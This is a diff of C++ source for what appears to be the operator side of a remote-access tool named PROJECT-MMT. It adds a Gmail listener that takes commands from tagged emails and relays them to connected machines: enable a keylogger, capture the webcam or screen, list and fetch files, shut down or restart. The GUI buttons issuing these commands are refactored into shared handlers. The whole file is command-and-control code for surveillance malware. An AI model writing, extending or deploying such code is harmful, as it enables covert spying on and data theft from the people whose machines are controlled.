@@ -11,6 +11,7 @@
 #include "Message.hpp"
 #include "ImGuiScrollableText.hpp"
 #include "GmailLib.hpp"
+#include "ServerMessageHandler.hpp"
 
 #define DEFAULT_PORT 62300
 
@@ -22,36 +23,6 @@ const std::string serverTempFolderName = "server_tmp";  //must not be empty stri
 GmailHandler gmail;
 
 ///////////////////////////////////////////////
-
-void MailListener() {
-    const std::string subject_to_find = "\"[PROJECT-MMT]\""; // Use quotes for exact phrases
-    const int polling_interval_seconds = 15;
-    // On first run, check last 10 mins
-    long long last_check_timestamp = getCurrentUnixTime() - 600;
-
-    while (true) {
-        long long next_check_timestamp = getCurrentUnixTime();
-        std::string query = "subject:" + subject_to_find + " after:" + std::to_string(last_check_timestamp);
-
-        // Get new messages
-        std::vector<std::string> new_message_ids;
-        // cout << "timestamp " << last_check_timestamp << ". ";
-        if(gmail.queryMessages(query, new_message_ids)) {
-            // cout << "query success " << new_message_ids.size() << " elements\n";
-            for(const auto& id : new_message_ids) {
-                MailMessage mailIdMsg;
-                gmail.getEmail(id, mailIdMsg);
-                miniConsole.AddLineSuccess("Mail received. From %s. Subject: %s. Body:\n%s", mailIdMsg.from.c_str(), mailIdMsg.subject.c_str(), mailIdMsg.body_text.c_str());
-                std::this_thread::sleep_for(std::chrono::seconds(polling_interval_seconds/6));
-            }
-        } else {
-            // cout << "query failed\n";
-        }
-
-        last_check_timestamp = next_check_timestamp;
-        std::this_thread::sleep_for(std::chrono::seconds(polling_interval_seconds));
-    }
-}
 
 ///////////////////////////////////////////////////////
 
@@ -103,38 +74,9 @@ private:
 
         if(msg.returnCode == 0) {
             //fail
-            switch(msg.commandNumber) {
-                case MessageDisableKeylog: {
-                    miniConsole.AddLineError("MessageDisableKeylog failed: %s", errorString.c_str());
-                    mailMsg.body_text = "MessageDisableKeylog failed: " + errorString;
-                    break;
-                }
-                case MessageEnableKeylog: {
-                    miniConsole.AddLineError("MessageEnableKeylog failed: %s", errorString.c_str());
-                    mailMsg.body_text = "MessageEnableKeylog failed: " + errorString;
-                    break;
-                }
-                case MessageScreenCap: {
-                    miniConsole.AddLineError("MessageScreenCap failed: %s", errorString.c_str());
-                    mailMsg.body_text = "MessageScreenCap failed: " + errorString;
-                    break;
-                }
-                case MessageInvokeWebcam: {
-                    miniConsole.AddLineError("MessageInvokeWebcam failed: %s", errorString.c_str());
-                    mailMsg.body_text = "MessageInvokeWebcam failed: " + errorString;
-                    break;
-                }
-                case MessageListFile: {
-                    miniConsole.AddLineError("MessageListFile failed: %s", errorString.c_str());
-                    mailMsg.body_text = "MessageListFile failed: " + errorString;
-                    break;
-                }
-                case MessageGetFile: {
-                    miniConsole.AddLineError("MessageGetFile failed: %s", errorString.c_str());
-                    mailMsg.body_text = "MessageGetFile failed: " + errorString;
-                    break;
-                }
-            }
+            std::string commandString = messageEnumToString((MessageEnum) msg.commandNumber);
+            miniConsole.AddLineError("%s failed: %s", commandString.c_str(), errorString.c_str());
+            mailMsg.body_text = commandString + " failed: " + errorString;
         } else {
             switch(msg.commandNumber) {
                 case MessageEnableKeylog: {
@@ -461,6 +403,132 @@ public:
 
 ///////////////////////////////////////////////////
 
+void MailListener() {
+    const std::string subject_to_find = "\"[PROJECT-MMT]\""; // Use quotes for exact phrases
+    const int polling_interval_seconds = 15;
+    // On first run, check last 10 mins
+    long long last_check_timestamp = getCurrentUnixTime() - 600;
+
+    while (true) {
+        long long next_check_timestamp = getCurrentUnixTime();
+        std::string query = "subject:" + subject_to_find + " after:" + std::to_string(last_check_timestamp);
+
+        // Get new messages
+        std::vector<std::string> new_message_ids;
+        // cout << "timestamp " << last_check_timestamp << ". ";
+        if(gmail.queryMessages(query, new_message_ids)) {
+            // cout << "query success " << new_message_ids.size() << " elements\n";
+            for(const auto& id : new_message_ids) {
+                MailMessage mailMsg;
+                if(!gmail.getEmail(id, mailMsg)) {
+                    continue;
+                }
+                std::thread([mailMsg] {
+                    std::stringstream ss(mailMsg.subject);
+                    std::string subjectTag, ipAddressPort, tmpstr;
+                    ss >> subjectTag >> ipAddressPort;
+                    ss = std::stringstream(mailMsg.body_text);
+                    std::vector<std::string> tokenVector;
+                    while(ss >> tmpstr) {
+                        tokenVector.push_back(tmpstr);
+                    }
+                    MessageEnum command = messageStringToEnum(tokenVector[0]);
+
+                    if(command == MessageUnknown) {
+                        miniConsole.AddLineWarning("Mail received. From %s. Target machine: %s. Unknown command", mailMsg.from.c_str(), mailMsg.subject.c_str(), ipAddressPort.c_str());
+                        return;
+                    } else {
+                        miniConsole.AddLineInfo("Mail received. From %s. Target machine: %s. Command:\n%s", mailMsg.from.c_str(), mailMsg.subject.c_str(), ipAddressPort.c_str(), tokenVector[0].c_str());
+                    }
+
+                    for(int i=0; i < (int) clientVector.size(); i++) {
+                        if(ipAddressPort == clientVector[i]->getPeerIpPort()) {
+                            bool status = false;
+                            std::string errorString = "<none>";
+                            switch(command) {
+                                case MessageRawText: {
+                                    std::string rawText = "";
+                                    for(int i=1; i < tokenVector.size(); i++) {
+                                        rawText = rawText + tokenVector[i] + " ";
+                                    }
+                                    status = MessageRawTextServerHandler(*clientVector[i], rawText, mailMsg.from);
+                                    break;
+                                }
+                                case MessageEnableKeylog: {
+                                    status = MessageEnableKeylogServerHandler(*clientVector[i], mailMsg.from);
+                                    break;
+                                }
+                                case MessageDisableKeylog: {
+                                    status = MessageDisableKeylogServerHandler(*clientVector[i], mailMsg.from);
+                                    break;
+                                }
+                                case MessageInvokeWebcam: {
+                                    int millisecond, fps;
+                                    if(tokenVector.size() < 2) {
+                                        errorString = "webcam millisecond parameter not supplied";
+                                        break;
+                                    }
+                                    millisecond = std::stoi(tokenVector[1]);
+                                    if(tokenVector.size() >= 3) {
+                                        fps = std::stoi(tokenVector[2]);
+                                    }
+                                    status = MessageInvokeWebcamServerHandler(*clientVector[i], millisecond, fps, mailMsg.from);
+                                    break;
+                                }
+                                case MessageScreenCap: {
+                                    status = MessageScreenCapServerHandler(*clientVector[i], mailMsg.from);
+                                    break;
+                                }
+                                case MessageListFile: {
+                                    std::string path;
+                                    if(tokenVector.size() < 2) {
+                                        errorString = "ListFile path parameter not supplied";
+                                        break;
+                                    }
+                                    path = tokenVector[1];
+                                    status = MessageListFileServerHandler(*clientVector[i], path, mailMsg.from);
+                                    break;
+                                }
+                                case MessageGetFile: {
+                                    std::string file;
+                                    if(tokenVector.size() < 2) {
+                                        errorString = "GetFile file parameter not supplied";
+                                        break;
+                                    }
+                                    file = tokenVector[1];
+                                    status = MessageGetFileServerHandler(*clientVector[i], file, mailMsg.from);
+                                    break;
+                                }
+                                case MessageShutdownMachine: {
+                                    status = MessageShutdownMachineServerHandler(*clientVector[i], mailMsg.from);
+                                    break;
+                                }
+                                case MessageRestartMachine: {
+                                    status = MessageRestartMachineServerHandler(*clientVector[i], mailMsg.from);
+                                    break;
+                                }
+                                default: break;
+                            }
+                            if(status) miniConsole.AddLineSuccess("%s from mail success", tokenVector[0].c_str());
+                            else miniConsole.AddLineError("%s from mail failed. Error: %s", tokenVector[0].c_str(), errorString.c_str());
+                            // break;
+                        }
+                    }
+                }).detach();
+                std::this_thread::sleep_for(std::chrono::seconds(polling_interval_seconds/6));
+            }
+        } else {
+            // cout << "query failed\n";
+        }
+
+        last_check_timestamp = next_check_timestamp;
+        std::this_thread::sleep_for(std::chrono::seconds(polling_interval_seconds));
+    }
+}
+
+
+/////////////////////////////////////////////////////
+
 bool doGmailFullAuth = false;
 bool isModalBlocking = false;
 
@@ -509,8 +577,8 @@ void RunGui() {
     ImGui::SeparatorText("Connected Clients");
     ImGui::Text("Active clients: %zu", clientVector.size());
     
-    for(int i=0; i < clientVector.size(); i++) {
-        auto& client = *clientVector[i];
+    for(int i=0; i < (int) clientVector.size(); i++) {
+        ClientSession& client = *clientVector[i];
         const std::string headerLabel = client.getPeerIpPort() + "###" + client.getPeerIpPort();
         
         if (ImGui::CollapsingHeader(headerLabel.c_str())) {
@@ -524,16 +592,10 @@ void RunGui() {
             if (ImGui::Button(client.makeWidgetName("Send raw text").c_str())) {
                 if (client.funcStruct.rawText.size() > 0) {
                     std::thread([&client] {
-                        Message textMessage;
-                        textMessage.commandNumber = MessageRawText;
-                        textMessage.setBinaryData(client.funcStruct.rawText.c_str(), client.funcStruct.rawText.size());
-                        
-                        if (client.sendData(textMessage)) {
-                            miniConsole.AddLineSuccess("Raw text Message sent to %s", 
-                                                        client.getPeerIpPort().c_str());
+                        if(MessageRawTextServerHandler(client, client.funcStruct.rawText)) {
+                            miniConsole.AddLineSuccess("Raw text Message sent to %s", client.getPeerIpPort().c_str());
                         } else {
-                            miniConsole.AddLineError("Failed to send raw text message to %s", 
-                                                    client.getPeerIpPort().c_str());
+                            miniConsole.AddLineError("Failed to send raw text message to %s", client.getPeerIpPort().c_str());
                         }
                     }).detach();
                 }
@@ -542,10 +604,7 @@ void RunGui() {
             if(ImGui::Checkbox("Func: Keylogger", &client.funcStruct.isKeyloggerActive)) {  //click -> already changed the state
                 if(client.funcStruct.isKeyloggerActive) {
                     std::thread([&client] {
-                        Message msg;
-                        msg.commandNumber = MessageEnableKeylog;
-                        
-                        if (client.sendData(msg)) {
+                        if (MessageEnableKeylogServerHandler(client)) {
                             miniConsole.AddLineSuccess("Enable Keylogger Message sent to %s", 
                                                         client.getPeerIpPort().c_str());
                         } else {
@@ -555,10 +614,7 @@ void RunGui() {
                     }).detach();
                 } else {
                     std::thread([&client] {
-                        Message msg;
-                        msg.commandNumber = MessageDisableKeylog;
-                        
-                        if (client.sendData(msg)) {
+                        if (MessageDisableKeylogServerHandler(client)) {
                             miniConsole.AddLineSuccess("Disable Keylogger Message sent to %s", 
                                                         client.getPeerIpPort().c_str());
                         } else {
@@ -571,13 +627,7 @@ void RunGui() {
             
             if(ImGui::Button(client.makeWidgetName("Invoke webcam").c_str())) {
                 std::thread([&client] {
-                    Message msg;
-                    msg.commandNumber = MessageInvokeWebcam;
-                    json jsonData;
-                    jsonData["millisecond"] = client.funcStruct.webcamDurationMs;
-                    jsonData["fps"] = client.funcStruct.webcamFps;
-                    msg.setJsonData(jsonData);
-                    if (client.sendData(msg)) {
+                    if(MessageInvokeWebcamServerHandler(client, client.funcStruct.webcamDurationMs, client.funcStruct.webcamFps)) {
                         miniConsole.AddLineSuccess("Invoke Webcam Message sent to %s", client.getPeerIpPort().c_str());
                     } else {
                         miniConsole.AddLineError("Failed to send Invoke Webcam message to %s", client.getPeerIpPort().c_str());
@@ -597,9 +647,7 @@ void RunGui() {
 
             if(ImGui::Button(client.makeWidgetName("Take Screenshot").c_str())) {
                 std::thread([&client] {
-                    Message msg;
-                    msg.commandNumber = MessageScreenCap;
-                    if (client.sendData(msg)) {
+                    if (MessageScreenCapServerHandler(client)) {
                         miniConsole.AddLineSuccess("Take Screenshot Message sent to %s", client.getPeerIpPort().c_str());
                     } else {
                         miniConsole.AddLineError("Failed to send Take Screenshot message to %s", client.getPeerIpPort().c_str());
@@ -611,12 +659,7 @@ void RunGui() {
             ImGui::InputText("Input path for listing directory", &client.funcStruct.pathText);
             if(ImGui::Button(client.makeWidgetName("List directory").c_str())) {
                 std::thread([&client] {
-                    Message msg;
-                    msg.commandNumber = MessageListFile;
-                    json jsonData;
-                    jsonData["fileName"] = client.funcStruct.pathText;
-                    msg.setJsonData(jsonData);
-                    if (client.sendData(msg)) {
+                    if (MessageListFileServerHandler(client, client.funcStruct.pathText)) {
                         miniConsole.AddLineSuccess("List directory Message sent to %s", client.getPeerIpPort().c_str());
                     } else {
                         miniConsole.AddLineError("Failed to send List directory message to %s", client.getPeerIpPort().c_str());
@@ -628,12 +671,7 @@ void RunGui() {
             ImGui::InputText("Input full-filename to get file", &client.funcStruct.getFileText);
             if(ImGui::Button(client.makeWidgetName("Get File").c_str())) {
                 std::thread([&client] {
-                    Message msg;
-                    msg.commandNumber = MessageGetFile;
-                    json jsonData;
-                    jsonData["fileName"] = client.funcStruct.getFileText;
-                    msg.setJsonData(jsonData);
-                    if (client.sendData(msg)) {
+                    if (MessageGetFileServerHandler(client, client.funcStruct.getFileText)) {
                         miniConsole.AddLineSuccess("Get File Message sent to %s", client.getPeerIpPort().c_str());
                     } else {
                         miniConsole.AddLineError("Failed to send Get File message to %s", client.getPeerIpPort().c_str());
@@ -645,9 +683,7 @@ void RunGui() {
 
             if(ImGui::Button(client.makeWidgetName("Shutdown").c_str())) {
                 std::thread([&client] {
-                    Message msg;
-                    msg.commandNumber = MessageShutdownMachine;
-                    if (client.sendData(msg)) {
+                    if (MessageShutdownMachineServerHandler(client)) {
                         miniConsole.AddLineSuccess("Shutdown Message sent to %s", client.getPeerIpPort().c_str());
                     } else {
                         miniConsole.AddLineError("Failed to send Shutdown message to %s", client.getPeerIpPort().c_str());
@@ -657,9 +693,7 @@ void RunGui() {
 
             if(ImGui::Button(client.makeWidgetName("Restart").c_str())) {
                 std::thread([&client] {
-                    Message msg;
-                    msg.commandNumber = MessageRestartMachine;
-                    if (client.sendData(msg)) {
+                    if (MessageRestartMachineServerHandler(client)) {
                         miniConsole.AddLineSuccess("Restart Message sent to %s", client.getPeerIpPort().c_str());
                     } else {
                         miniConsole.AddLineError("Failed to send Restart message to %s", client.getPeerIpPort().c_str());
